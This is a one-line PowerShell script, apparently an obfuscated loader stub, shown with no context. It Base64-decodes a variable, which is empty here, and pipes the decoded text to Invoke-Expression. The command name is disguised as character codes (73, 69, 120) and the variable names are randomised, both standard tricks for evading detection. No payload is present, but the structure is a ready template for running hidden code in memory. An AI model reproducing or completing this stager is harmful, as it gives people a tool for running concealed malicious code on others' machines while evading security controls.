$INTMJM="";$SZZI=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($INTMJM));$SZZI|&([char]73+[char]69+[char]120)